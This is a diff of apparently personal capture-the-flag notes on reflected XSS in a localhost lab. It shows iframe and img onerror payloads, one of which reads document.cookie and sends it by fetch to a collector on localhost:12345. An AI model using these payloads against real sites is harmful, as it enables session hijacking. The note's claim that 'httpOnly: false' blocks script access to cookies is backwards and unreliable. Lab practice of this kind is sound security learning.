@@ -44,7 +44,7 @@
        => <script> or </script> tag will be replaced by "".
        => we need to find tags that can have same function with script such as:
               + <iframe src="{An injected URL}"></iframe>              // use iframe with src to inject sthg...
-              + <img src="error_image" onerror="alert("sthg here")">   // take advantage of error img.
+              + <img src="error_image" onerror="alert('sthg here')">   // take advantage of error img.
 
        - Use previous payload for this level:   <iframe src="const cookie = document.cookie; const cookiesteal = `http://localhost:12345/lol?cookie=${cookie}`;fetch(cookiesteal);"></iframe>
        => *BOOM*
@@ -74,5 +74,31 @@
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
        [LEVEL 4]-TARGET: http://localhost:13004
-
        
+       - It still have a little diff that in this level in app.js
+
+              ...
+            app.use(
+            session({
+                resave: false,
+                saveUninitialized: true,
+                secret: process.env.SECRET_KEY,
+                cookie: {
+                maxAge: 86400000,
+                httpOnly: false 
+                },
+            }));
+            ...
+
+       => It mean that we can't access to cookie data by client-side scripts.
+       => Use these tag:
+              
+              + <iframe src="{An injected URL}"></iframe>              // use iframe with src to inject sthg...
+              + <img src="error_image" onerror="alert('sthg here')">   // take advantage of error img.
+
+       - Ex: <img src="error_image" onerror="window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';">
+       => Successful...
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       [LEVEL 5]-TARGET: http://localhost:13005
